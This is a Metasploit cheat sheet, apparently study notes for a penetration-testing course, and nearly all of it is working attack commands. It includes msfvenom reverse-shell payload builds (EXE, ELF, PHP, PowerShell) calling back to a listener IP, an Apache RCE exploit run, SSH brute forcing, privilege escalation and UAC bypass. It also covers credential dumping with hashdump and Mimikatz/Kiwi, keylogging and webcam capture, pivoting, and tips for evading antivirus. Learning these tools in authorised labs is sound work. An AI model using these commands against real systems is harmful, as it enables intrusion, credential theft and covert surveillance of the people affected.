# The Metasploit Framework - Complete Cheat Sheet

## Core Concepts

### What is Metasploit?
- **Framework**: Open-source exploit development/testing platform by Rapid7
- **Purpose**: Consolidates exploits, payloads, post-exploitation tools
- **Language**: Written in Ruby
- **Package**: `metasploit-framework` on Kali Linux

### Why Use Metasploit?
✅ Standardized exploit interface
✅ Dynamic payload selection
✅ Automated session management
✅ Database storage of findings
✅ Post-exploitation modules
✅ Built-in pivoting capabilities

---

## Setup and Configuration

### Initialize Database
```bash
# Create and initialize MSF database
sudo msfdb init

# Enable PostgreSQL at boot
sudo systemctl enable postgresql

# Start Metasploit
sudo msfconsole
sudo msfconsole -q  # Quiet mode (no banner)

# Verify database connection
db_status
```

### Workspaces
```bash
# List workspaces
workspace

# Create new workspace
workspace -a pen200

# Switch workspace
workspace pen200

# Delete workspace
workspace -d pen200
```

**Purpose**: Separate data from different assessments

---

## Database Commands

### Scanning and Data Storage
```bash
# Nmap scan with automatic DB storage
db_nmap -A 192.168.50.202

# List discovered hosts
hosts

# List discovered services
services
services -p 445  # Filter by port

# List vulnerabilities
vulns

# List credentials
creds

# Show loot
loot
```

---

## Module Types

### Module Categories
- **Auxiliary**: Scanners, fuzzers, enumeration
- **Exploit**: Vulnerability exploitation
- **Post**: Post-exploitation actions
- **Payload**: Code executed after exploitation
- **Encoder**: Payload obfuscation
- **Evasion**: AV/IDS evasion
- **NOP**: No-operation code generators

### Module Syntax
```
module_type/os_vendor_app/module_name

Examples:
auxiliary/scanner/smb/smb_version
exploit/multi/http/apache_normalize_path_rce
post/windows/manage/migrate
```

---

## Auxiliary Modules

### Common Commands
```bash
# Show all auxiliary modules
show auxiliary

# Search for modules
search type:auxiliary smb
search type:auxiliary ssh

# Use module (by name or index)
use auxiliary/scanner/smb/smb_version
use 56  # From search results

# Show module info
info

# Show options
show options

# Show required but unset options
show missing
```

### Setting Options
```bash
# Set single option
set RHOSTS 192.168.50.202
set THREADS 10

# Set from database results
services -p 445 --rhosts

# Unset option
unset RHOSTS

# Set global option (across all modules)
setg RHOSTS 192.168.50.0/24

# Unset global option
unsetg RHOSTS

# Launch module
run
```

### Example: SMB Version Detection
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.50.202
run
```

### Example: SSH Brute Force
```bash
use auxiliary/scanner/ssh/ssh_login
set USERNAME george
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 192.168.50.201
set RPORT 2222
run
```

---

## Exploit Modules

### Using Exploit Modules
```bash
# Search for exploits
search Apache 2.4.49
search CVE-2021-42013

# Use exploit
use exploit/multi/http/apache_normalize_path_rce

# Show info
info

# Check available targets
show targets

# Check if target is vulnerable
check

# Show options
show options

# Show payloads compatible with exploit
show payloads
```

### Key Info Fields
- **Platform**: Target OS (Linux, Windows, etc.)
- **Arch**: Architecture (x86, x64, ARM, etc.)
- **Module side effects**: IOCs, artifacts on disk
- **Module stability**: Crash risk
- **Module reliability**: Can run multiple times?
- **Available targets**: Different OS/app versions
- **Check supported**: Can verify vulnerability before exploit

### Setting Payload
```bash
# Set specific payload
set payload linux/x64/shell_reverse_tcp

# View payload options
show options
```

### Example: Apache RCE
```bash
use exploit/multi/http/apache_normalize_path_rce
set payload linux/x64/shell_reverse_tcp
set LHOST 192.168.119.2
set LPORT 4444
set SSL false
set RPORT 80
set RHOSTS 192.168.50.16
run
```

---

## Sessions and Jobs

### Sessions
**Purpose**: Manage access to exploited targets
```bash
# List sessions
sessions -l

# Interact with session
sessions -i 2

# Background current session
# Press Ctrl+Z, then confirm

# Kill session
sessions -k 2

# Kill all sessions
sessions -K
```

### Jobs
**Purpose**: Run modules in background
```bash
# Run as job
run -j

# List jobs
jobs

# Kill job
jobs -k 1
```

---

## Payloads

### Staged vs Non-Staged

| Feature | Staged | Non-Staged |
|---------|--------|------------|
| **Syntax** | `shell/reverse_tcp` | `shell_reverse_tcp` |
| **Size** | Smaller (two-part) | Larger (all-in-one) |
| **Stability** | Less stable | More stable |
| **Detection** | Harder to detect | Easier to detect |
| **Use Case** | Space constraints | Reliable execution |

**Staged**: `/` in name (e.g., `windows/x64/shell/reverse_tcp`)
**Non-Staged**: `_` in name (e.g., `windows/x64/shell_reverse_tcp`)

### Common Payload Types
```bash
# Linux reverse shells
linux/x64/shell_reverse_tcp           # Non-staged
linux/x64/shell/reverse_tcp          # Staged
linux/x64/meterpreter_reverse_tcp    # Meterpreter non-staged
linux/x64/meterpreter/reverse_tcp    # Meterpreter staged

# Windows reverse shells
windows/x64/shell_reverse_tcp              # Non-staged
windows/x64/shell/reverse_tcp             # Staged
windows/x64/meterpreter_reverse_tcp       # Meterpreter non-staged
windows/x64/meterpreter/reverse_tcp      # Meterpreter staged
windows/x64/meterpreter_reverse_https    # HTTPS non-staged
```

### Payload Options
```bash
# Common options
set LHOST 192.168.119.2  # Listener IP
set LPORT 4444           # Listener port

# For HTTPS payloads
set LURI /custom_path    # Optional custom URI
```

**Note**: Default port 4444 often blocked - consider using 80, 443, or other common ports

---

## Meterpreter Payload

### Overview
- **Type**: Advanced multi-function payload
- **Features**: Encrypted, in-memory, dynamic extensions
- **Platforms**: Windows, Linux, macOS, Android
- **Advantage**: Rich post-exploitation capabilities

### Basic Commands
```bash
# Get system info
sysinfo
getuid
getpid

# Check user idle time
idletime

# Background session
background
bg

# Get help
help
```

### Core Commands
```
?                 # Help menu
background        # Background session
channel           # Manage channels
close             # Close channel
info              # Module info
load              # Load extension
run               # Execute script/module
sessions          # Switch sessions
shell             # Drop to system shell
```

### System Commands
```
execute           # Execute command
getenv            # Get environment variables
getpid            # Get process ID
getuid            # Get current user
kill              # Kill process
ps                # List processes
shell             # System command shell
sysinfo           # System information
```

### File System Commands
```bash
# Navigation
cd /path
pwd
getwd
lcd /local/path   # Change local directory
lpwd              # Print local directory

# File operations
cat file.txt
download /remote/file /local/path
upload /local/file /remote/path
ls
mkdir dirname
rm filename
search -f *.txt

# File management
chmod 644 file
cp source dest
mv source dest
```

### Channels
**Purpose**: Manage multiple interactive streams
```bash
# Start interactive shell (creates channel)
shell

# Background channel
# Press Ctrl+Z

# List channels
channel -l

# Interact with channel
channel -i 1

# Close channel
channel -c 1
```

### Example Usage
```bash
# Start Meterpreter session
meterpreter > sysinfo
meterpreter > getuid

# Download file
meterpreter > lpwd
meterpreter > lcd /home/kali/Downloads
meterpreter > download /etc/passwd
meterpreter > lcat /home/kali/Downloads/passwd

# Upload file
meterpreter > upload /usr/bin/unix-privesc-check /tmp/
meterpreter > ls /tmp
```

### Windows Path Note
```bash
# Escape backslashes on Windows
upload file.exe C:\\Windows\\Temp\\file.exe
```

### HTTPS Meterpreter
```bash
# Use HTTPS payload for encrypted traffic
set payload linux/x64/meterpreter_reverse_https
set LHOST 192.168.119.2
set LPORT 443
set LURI /custom  # Optional
run
```

**Advantage**: Encrypted traffic, appears as normal HTTPS

---

## Executable Payloads (msfvenom)

### Overview
**Tool**: `msfvenom` - Generate standalone payload files
**Formats**: EXE, DLL, PowerShell, Python, PHP, etc.

### Basic Syntax
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output_file>
```

### List Options
```bash
# List payloads
msfvenom -l payloads
msfvenom -l payloads --platform windows --arch x64

# List formats
msfvenom -l formats

# List encoders
msfvenom -l encoders
```

### Examples

**Windows EXE (non-staged):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o shell.exe
```

**Windows EXE (staged):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
```

**Meterpreter HTTPS:**
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
```

**Linux ELF:**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f elf -o shell.elf
```

**PHP Web Shell:**
```bash
msfvenom -p php/reverse_php LHOST=192.168.119.2 LPORT=443 -f raw -o shell.php
```

**PowerShell:**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f psh -o shell.ps1
```

### Using multi/handler

**For Non-Staged Payloads:**
```bash
# Netcat works fine
nc -nvlp 443
```

**For Staged/Advanced Payloads:**
```bash
# Must use multi/handler
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST 192.168.119.2
set LPORT 443
run

# Or run as background job
run -j
```

**Check Running Jobs:**
```bash
jobs
```

**Stop Job:**
```bash
jobs -k 1
```

---

## Post-Exploitation with Meterpreter

### Privilege Escalation

**Check privileges:**
```bash
meterpreter > shell
C:\> whoami /priv
```

**Elevate to SYSTEM:**
```bash
meterpreter > getuid
meterpreter > getsystem
meterpreter > getuid
```

**Techniques used by getsystem:**
- Named Pipe Impersonation
- Token Duplication
- PrintSpooler variant

**Requirements**: SeImpersonatePrivilege or SeDebugPrivilege

### Process Migration

**Why migrate?**
- Avoid detection (suspicious process names)
- Maintain access if process closes
- Move to more stable process

**List processes:**
```bash
meterpreter > ps
```

**Migrate to existing process:**
```bash
meterpreter > migrate 8052
```

**Create and migrate to new process:**
```bash
meterpreter > execute -H -f notepad
meterpreter > migrate 2720
```

**Options for execute:**
- `-H`: Hidden (no GUI window)
- `-f`: File to execute

**Important**: Can only migrate to processes at same/lower privilege level

### Additional Features
```bash
# Dump password hashes
hashdump

# Screen sharing
screenshare

# Keylogging
keyscan_start
keyscan_dump
keyscan_stop

# Webcam
webcam_list
webcam_snap
webcam_stream

# Get environment variable
getenv FLAG
```

---

## Post-Exploitation Modules

### Using Post Modules
```bash
# Search for post modules
search type:post UAC
search type:post windows

# Use module
use post/windows/manage/migrate

# Set session
set SESSION 1

# Run
run
```

### UAC Bypass Example
```bash
# Find UAC bypass modules
search UAC

# Use bypass module
use exploit/windows/local/bypassuac_sdclt
set SESSION 9
set LHOST 192.168.119.4
run

# New high-integrity session created
```

**Check integrity level (PowerShell):**
```powershell
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
```

### Kiwi Extension (Mimikatz)

**Load Kiwi:**
```bash
meterpreter > load kiwi
```

**Kiwi Commands:**
```bash
creds_all              # All credentials
creds_kerberos         # Kerberos tickets
creds_msv              # LM/NTLM hashes
creds_ssp              # SSP credentials
creds_wdigest          # WDigest credentials
lsa_dump_sam           # Dump SAM database
lsa_dump_secrets       # Dump LSA secrets
dcsync_ntlm            # DCSync attack
golden_ticket_create   # Golden ticket
kerberos_ticket_list   # List Kerberos tickets
wifi_list              # WiFi credentials
```

**Example:**
```bash
# Requires SYSTEM privileges
meterpreter > getsystem
meterpreter > load kiwi
meterpreter > creds_msv
```

---

## Pivoting with Metasploit

### Manual Route Addition
```bash
# Add route through session
route add 172.16.5.0/24 12

# View routes
route print

# Remove route
route delete 172.16.5.0/24 12

# Remove all routes
route flush
```

### Automatic Route (autoroute)
```bash
use post/multi/manage/autoroute
set SESSION 12
run

# Automatically adds routes for all networks reachable by session
```

### Port Scanning Through Pivot
```bash
# Use TCP scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run

# Other scanners work too
use auxiliary/scanner/smb/smb_version
set RHOSTS 172.16.5.200
run
```

### SOCKS Proxy
```bash
# Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j

# Configure proxychains (/etc/proxychains4.conf)
socks5 127.0.0.1 1080

# Use with external tools
proxychains xfreerdp /v:172.16.5.200 /u:user
proxychains nmap -sT -Pn 172.16.5.200
```

### Port Forwarding (portfwd)
```bash
# From within Meterpreter session
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.5.200

# Now connect to localhost
xfreerdp /v:127.0.0.1 /u:user

# List forwards
portfwd list

# Delete forward
portfwd delete -l 3389

# Delete all
portfwd flush
```

### PSExec Through Pivot

**Important**: Use **bind** payload (not reverse)
```bash
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass password123
set RHOSTS 172.16.5.200
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run
```

**Why bind?** Reverse payload can't route back through pivot

---

## Resource Scripts

### What are Resource Scripts?
- Automate Metasploit commands
- Written in Ruby or MSF commands
- Extension: `.rc`
- Location: `/usr/share/metasploit-framework/scripts/resource/`

### Create Resource Script

**Example: Auto-listener (listener.rc)**
```ruby
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
run -z -j
```

**Options explained:**
- `AutoRunScript`: Run module after session created
- `ExitOnSession false`: Keep listening after session
- `run -z -j`: Run as background job, don't interact

### Execute Resource Script
```bash
# From command line
sudo msfconsole -r listener.rc

# From within msfconsole
resource /path/to/script.rc
```

### Built-in Scripts
```bash
# List available scripts
ls /usr/share/metasploit-framework/scripts/resource/

# Examples:
# auto_brute.rc          - Brute forcing
# portscan.rc            - Port scanning
# smb_checks.rc          - SMB enumeration
# auto_win32_multihandler.rc - Windows handlers
```

### Global Variables
```bash
# Set global (persists across modules)
setg RHOSTS 192.168.50.0/24
setg LHOST 192.168.119.2

# Unset global
unsetg RHOSTS
```

---

## Quick Reference Tables

### Common Ports for Payloads
| Port | Protocol | Why Use |
|------|----------|---------|
| 443 | HTTPS | Common, usually allowed |
| 80 | HTTP | Common, usually allowed |
| 53 | DNS | Usually allowed |
| 8080 | HTTP-Alt | Web traffic |
| 4444 | Default | MSF default (often blocked) |

### Payload Selection Guide
| Scenario | Payload Type |
|----------|-------------|
| Space constraints | Staged |
| Stability critical | Non-staged |
| Evade detection | Staged |
| Quick/reliable | Non-staged |
| Already have access | Meterpreter |
| Need encryption | HTTPS payload |

### Session Types
| Type | Description | Example |
|------|-------------|---------|
| shell | Basic command shell | `shell_reverse_tcp` |
| meterpreter | Advanced payload | `meterpreter_reverse_tcp` |
| command | Single command execution | N/A |

---

## Common Workflows

### Workflow 1: Basic Exploitation
```bash
# 1. Search for exploit
search apache 2.4.49

# 2. Use exploit
use 0

# 3. Set options
set RHOSTS 192.168.50.16
set payload linux/x64/shell_reverse_tcp
set LHOST 192.168.119.2
set LPORT 443

# 4. Check if vulnerable (optional)
check

# 5. Exploit
run
```

### Workflow 2: Meterpreter Session
```bash
# 1. Generate payload
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe

# 2. Set up listener
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
run -j

# 3. Execute on target (transfer met.exe first)

# 4. Interact with session
sessions -i 1
```

### Workflow 3: Post-Exploitation
```bash
# 1. Check user
getuid

# 2. Elevate privileges
getsystem

# 3. Migrate process
ps
migrate 1234

# 4. Load Kiwi
load kiwi
creds_msv

# 5. Dump hashes
hashdump
```

### Workflow 4: Pivoting
```bash
# 1. Add route
route add 172.16.5.0/24 1

# 2. Scan internal network
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
run

# 3. Set up SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j

# 4. Use proxychains
proxychains nmap -sT 172.16.5.200
```

---

## Troubleshooting

### Common Issues

**Database not connected:**
```bash
sudo msfdb init
sudo systemctl start postgresql
```

**Payload not working:**
- Check LHOST is correct interface
- Verify firewall allows port
- Ensure staged payload uses multi/handler
- Try different port (not 4444)

**Session dies immediately:**
- Migrate to stable process
- Use non-staged payload
- Check antivirus

**Can't migrate:**
- Ensure target process is same/lower privilege
- Use getsystem first for more options
- Try different process

**Pivoting fails:**
- Verify route added: `route print`
- Use bind payload (not reverse)
- Check session is alive

---

## Security Considerations

### Detection Risks
⚠️ Metasploit is well-known to defenders
⚠️ Default payloads easily detected by AV
⚠️ Port 4444 commonly blocked/monitored
⚠️ Process names may be suspicious (met.exe)
⚠️ Network patterns detectable

### Best Practices
✅ Use HTTPS payloads for encryption
✅ Change default ports
✅ Migrate to legitimate processes
✅ Use AutoRunScript for auto-migration
✅ Clean up artifacts after engagement
✅ Obtain initial foothold with other methods
✅ Deploy Meterpreter after bypassing AV

### Cleanup
```bash
# Kill sessions
sessions -K

# Stop jobs
jobs -k 1

# Remove uploaded files on target
shell
rm /tmp/met.exe
```

---

## Command Quick Reference

### Essential Commands
```bash
# Core
help                  # Help menu
search <term>         # Search modules
use <module>          # Activate module
info                  # Module info
show options          # Show options
set <option> <value>  # Set option
run                   # Execute module
back                  # Exit module
exit                  # Exit msfconsole

# Database
db_status             # Check DB connection
workspace             # Manage workspaces
db_nmap               # Nmap with DB storage
hosts                 # List hosts
services              # List services
creds                 # List credentials
vulns                 # List vulnerabilities

# Sessions
sessions -l           # List sessions
sessions -i <id>      # Interact with session
sessions -k <id>      # Kill session
sessions -K           # Kill all sessions

# Jobs
jobs                  # List jobs
jobs -k <id>          # Kill job

# Resources
resource <file>       # Run resource script
```

### Meterpreter Commands
```bash
# Core
help                  # Help
background            # Background session
shell                 # System shell
info                  # Post module info
load <extension>      # Load extension

# System
sysinfo               # System info
getuid                # Current user
ps                    # Process list
migrate <pid>         # Migrate process
execute               # Execute command
kill <pid>            # Kill process

# Files
download <remote> <local>
upload <local> <remote>
cd <dir>
ls
pwd
cat <file>
search -f <pattern>

# Post-exploitation
getsystem             # Elevate to SYSTEM
hashdump              # Dump hashes
screenshare           # Share screen
```

---

## Lab Exercises Checklist

### Basic Operations
- [ ] Initialize MSF database
- [ ] Create workspace
- [ ] Run db_nmap scan
- [ ] View hosts, services, creds

### Auxiliary Modules
- [ ] Use SMB version scanner
- [ ] Perform SSH brute force
- [ ] View results in database

### Exploit Modules
- [ ] Find and use exploit module
- [ ] Set payload and options
- [ ] Check if vulnerable
- [ ] Execute exploit
- [ ] Manage sessions

### Payloads
- [ ] Use staged payload
- [ ] Use non-staged payload
- [ ] Use Meterpreter
- [ ] Generate executable with msfvenom
- [ ] Set up multi/handler
- [ ] Receive staged/non-staged shells

### Post-Exploitation
- [ ] Use getsystem
- [ ] Migrate process
- [ ] Use Kiwi to dump credentials
- [ ] Run UAC bypass module
- [ ] Download/upload files

### Pivoting
- [ ] Add manual route
- [ ] Use autoroute
- [ ] Set up SOCKS proxy
- [ ] Use portfwd
- [ ] Scan through pivot
- [ ] Exploit through pivot

### Automation
- [ ] Create resource script
- [ ] Use resource script
- [ ] Set up auto-listener with migration

---

**End of Cheat Sheet** - Master Metasploit for efficient penetration testing! 🎯
